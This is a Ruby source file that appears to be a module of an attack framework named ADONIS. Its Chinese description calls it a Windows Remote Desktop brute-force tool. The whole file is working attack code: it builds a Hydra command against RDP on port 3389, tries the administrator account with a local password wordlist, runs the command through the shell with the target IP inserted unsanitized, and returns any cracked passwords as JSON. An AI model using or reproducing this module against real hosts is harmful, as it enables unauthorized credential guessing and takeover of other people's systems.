#encoding: utf-8

require 'thread'

module ADONIS
module MODULE
module EXPLOIT

class Windows_rdp_fource_login < ::ADONIS::EXPLOIT::Base

    def init
        module_id = "4000"
        module_name = "windows_rdp_fource_login"
        module_desc = "Windows远程桌面暴力破解"
        port_str = "tcp_3389"
        update_info(module_id, module_name, module_desc, port_str, false)
        @cmd = File.join(::ADONIS::BinDir, "hydra")
        @passwd_file = File.join(::ADONIS::DataDir, "local_wordlists/rdp.txt")
        @args = "-l administrator -P #{@passwd_file} -t 1 -e ns"
        return self
    end

    def exploit_fuc host
        ::ADONIS.exploit_logger.info("ADONIS::MODULE::EXPLOIT::Windows_rdp_fource_login, #{@info[:id]}: #{host.ip}")
        command = "#{@cmd} #{@args} #{host.ip} rdp"
        p command

        out = `#{command}`
        
        password_list = ::ADONIS::EXPLOIT::Hydra.check out
        
        if password_list.nil? 
            return nil
        else
            return password_list.to_json
        end
    end

    def control_fuc ip
        return nil
    end

end

end
end
end

